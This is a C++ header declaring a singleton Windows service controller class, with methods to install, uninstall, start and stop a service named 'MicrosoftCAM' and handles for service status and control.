#ifndef CSERVICECONTROLLER_H
#define CSERVICECONTROLLER_H
#pragma once

#include "../logger/CLogger.h"
#include "../CGlobal.h"

#define SERVICE_NAME "MicrosoftCAM"

class CServiceController
{
private :
	static CServiceController* m_controller;
	void ExecuteProcess();
	SERVICE_TABLE_ENTRY *m_lpServiceStartTable;
	SERVICE_STATUS_HANDLE m_hServiceStatusHandle; 
	SERVICE_STATUS m_ServiceStatus; 
	friend void MonitorThread(void *);
	friend void WINAPI Main(DWORD dwArgc, LPTSTR *lpszArgv);
	friend void WINAPI Handler(DWORD fdwControl);
public :
	CServiceController();
	~CServiceController();

	static CServiceController* Instance();

	void StartTask();

	void Install(char* _pPath, char* _pName);
	void Uninstall(char* _pName);
	bool RunService(char* _pName);
	bool KillService(char* _pName);

	/*char* Name() { return m_pServiceName; }
	char* CmdLineData() { return m_lpCmdLineData; }
	char* LogFile() { return m_pLogFile; }
	char* ExeFile() { return m_pExeFile; }*/
};

#endif